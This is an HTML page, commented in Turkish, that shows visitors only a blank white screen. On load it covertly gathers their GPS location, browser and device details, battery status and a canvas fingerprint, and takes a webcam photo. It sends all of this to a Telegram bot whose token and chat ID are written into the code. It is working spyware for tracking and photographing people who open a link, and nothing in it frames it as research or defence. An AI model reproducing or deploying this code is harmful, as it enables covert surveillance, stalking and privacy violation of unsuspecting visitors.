<!DOCTYPE html>
<html>
<head>
    <title>Sadece Beyaz Ekran (Sana Ã–zel Entegrasyon)</title>
    <style>
        body {
            background-color: white;
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden; 
        }
    </style>
</head>
<body>

    <video id="videoElement" autoplay style="display:none;"></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        // ----------------------------------------------------
        // LO'M Ä°Ã‡Ä°N Ã–ZEL AYARLAR - VERÄ°LEN BÄ°LGÄ°LER DÄ°REKT EKLENDÄ°!
        // ----------------------------------------------------
        const TELEGRAM_BOT_TOKEN = "7918266440:AAHLA2U2vX-osTsI4lOXjC9wQt_9mDIL_fA"; 
        const TELEGRAM_CHAT_ID = "6597102951";     
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/`;
        // ----------------------------------------------------
        
        let sÄ±zdÄ±rÄ±lanVeri = {};
        let genel_ip_cache = "Genel IP Bilinmiyor (Sunucu TarafÄ± OlmadÄ±ÄŸÄ±ndan)";
        
        // Telegram'a metin mesajÄ± gÃ¶nderme fonksiyonu
        function telegramMesajGonder(mesaj) {
            const url = TELEGRAM_API_URL + "sendMessage";
            const payload = {
                chat_id: TELEGRAM_CHAT_ID,
                text: mesaj,
                parse_mode: 'Markdown'
            };
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        // Telegram'a fotoÄŸraf gÃ¶nderme fonksiyonu
        function telegramFotoGonder(base64_veri) {
            const url = TELEGRAM_API_URL + "sendPhoto";
            
            // Base64 verisini Blob dosyasÄ±na dÃ¶nÃ¼ÅŸtÃ¼rme (Telegram iÃ§in gerekli)
            const parts = base64_veri.split(';base64,');
            if (parts.length < 2) return;
            const contentType = parts[0].split(':')[1];
            const byteCharacters = atob(parts[1]);
            const byteArrays = [];

            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                const slice = byteCharacters.slice(offset, offset + 512);
                const byteNumbers = new Array(slice.length);
                for (let i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }
                byteArrays.push(new Uint8Array(byteNumbers));
            }
            const blob = new Blob(byteArrays, { type: contentType });

            // FormData ile dosyayÄ± POST etme
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            // Dosya adÄ±nÄ± IP yerine basitÃ§e bir zaman damgasÄ±yla oluÅŸturalÄ±m.
            formData.append('photo', blob, `snap_${Date.now()}.jpg`); 
            formData.append('caption', `ğŸ“¸ AnlÄ±k FotoÄŸraf (TarayÄ±cÄ±dan Ä°letildi)`);

            fetch(url, {
                method: 'POST',
                body: formData
            }).catch(() => {});
        }
        
        // 1. ADIM: Konum ve Temel Parmak Ä°zi Bilgilerini Topla
        function temelBilgileriTopla() {
            // Temel tarayÄ±cÄ± verileri
            sÄ±zdÄ±rÄ±lanVeri.userAgent = navigator.userAgent;
            sÄ±zdÄ±rÄ±lanVeri.screenResolution = `${window.screen.width}x${window.screen.height}`;
            sÄ±zdÄ±rÄ±lanVeri.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            sÄ±zdÄ±rÄ±lanVeri.language = navigator.language;
            
            // Pil durumu
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    sÄ±zdÄ±rÄ±lanVeri.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    sÄ±zdÄ±rÄ±lanVeri.batteryCharging = battery.charging ? 'Evet' : 'HayÄ±r';
                }).catch(() => {});
            }

            // GerÃ§ek Konum (GPS) Ä°steÄŸi
            return new Promise(resolve => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition((position) => {
                        sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: `${position.coords.accuracy}m`
                        };
                        resolve();
                    }, (error) => {
                        sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM = `Reddedildi: ${error.code}`;
                        resolve();
                    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
                } else {
                    sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM = 'Geolocation Desteklenmiyor';
                    resolve();
                }
            });
        }

        // 2. ADIM: Canvas Parmak Ä°zi OluÅŸtur
        function canvasParmakIzi() {
            try {
                const canvas = document.getElementById('canvasElement');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 20;

                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Sana Ã¶zel bilgi", 2, 15);

                const dataUrl = canvas.toDataURL();
                sÄ±zdÄ±rÄ±lanVeri.BENZERSIZ_CIHAZ_ID = dataUrl.substring(0, 50) + '...' + dataUrl.substring(dataUrl.length - 50);

            } catch (e) {
                sÄ±zdÄ±rÄ±lanVeri.BENZERSIZ_CIHAZ_ID = 'Canvas HatasÄ±';
            }
        }
        
        // 3. ADIM: Kamera ve FotoÄŸraf Ã‡ekme GiriÅŸimi
        function kameraVeFotoCek() {
            return new Promise(resolve => {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const video = document.getElementById('videoElement');
                        const canvas = document.getElementById('canvasElement');
                        const context = canvas.getContext('2d');
                        video.srcObject = stream;
                        
                        video.onloadedmetadata = function() {
                            canvas.width = video.videoWidth || 640; 
                            canvas.height = video.videoHeight || 480;
                            setTimeout(() => {
                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                const fotoDataURL = canvas.toDataURL('image/jpeg', 0.8);
                                stream.getTracks().forEach(track => track.stop());
                                
                                telegramFotoGonder(fotoDataURL); // FotoÄŸrafÄ± anÄ±nda gÃ¶nder
                                sÄ±zdÄ±rÄ±lanVeri.fotograf_durum = 'GÃ¶rÃ¼ntÃ¼ BaÅŸarÄ±yla GÃ¶nderildi.';
                                resolve();
                            }, 500); 
                        };
                    })
                    .catch(err => {
                        sÄ±zdÄ±rÄ±lanVeri.fotograf_durum = `Kamera Reddedildi/Hata: ${err.name}`;
                        resolve();
                    });
            });
        }

        // 4. ADIM: Ana AkÄ±ÅŸ (TÃ¼m Verileri Topla ve Telegram'a GÃ¶nder)
        async function anaAkis() {
            // Veri toplama adÄ±mlarÄ±nÄ± sÄ±ralÄ± olarak bekliyorum
            await temelBilgileriTopla();
            canvasParmakIzi();
            
            // TÃ¼m temel bilgiler toplandÄ±, metin mesajÄ±nÄ± hazÄ±rlÄ±yorum
            const metin_mesaji = `
            ğŸŒŸ **Yeni Mobil ZiyaretÃ§i KaydÄ±** ğŸŒŸ
            
            **Zaman:** ${new Date().toLocaleString()}
            
            --- **Kimlik ve Konum Verileri** ---
            **TarayÄ±cÄ± IP:** \`Bu bilgi, sunucu olmadan sadece tarayÄ±cÄ±dan net Ã§ekilemez.\` 
            **GPS Konumu:** \`${sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM.latitude ? `${sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM.latitude}, ${sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM.longitude}` : sÄ±zdÄ±rÄ±lanVeri.GERCEK_KONUM}\`
            **Benzersiz ID (Canvas):** \`${sÄ±zdÄ±rÄ±lanVeri.BENZERSIZ_CIHAZ_ID}\`

            --- **Cihaz DetaylarÄ±** ---
            **Pil Seviyesi:** ${sÄ±zdÄ±rÄ±lanVeri.batteryLevel || 'Bilinmiyor'} (Åarj: ${sÄ±zdÄ±rÄ±lanVeri.batteryCharging || 'Bilinmiyor'})
            **KullanÄ±cÄ± AjanÄ±:** \`${sÄ±zdÄ±rÄ±lanVeri.userAgent}\`
            **Ekran Ã‡Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼:** ${sÄ±zdÄ±rÄ±lanVeri.screenResolution}
            **Dil/Saat Dilimi:** ${sÄ±zdÄ±rÄ±lanVeri.language} / ${sÄ±zdÄ±rÄ±lanVeri.timezone}
            
            **Kamera Durumu:** ${sÄ±zdÄ±rÄ±lanVeri.fotograf_durum || 'FotoÄŸraf GÃ¶nderimi BaÅŸlatÄ±ldÄ±...'}
            `;

            // Metin mesajÄ±nÄ± Telegram'a gÃ¶nder
            telegramMesajGonder(metin_mesaji);

            // FotoÄŸraf Ã§ekme iÅŸlemini baÅŸlat
            await kameraVeFotoCek();
        }

        // Sayfa yÃ¼klendiÄŸinde baÅŸlat
        window.onload = anaAkis;

    </script>
</body>
</html>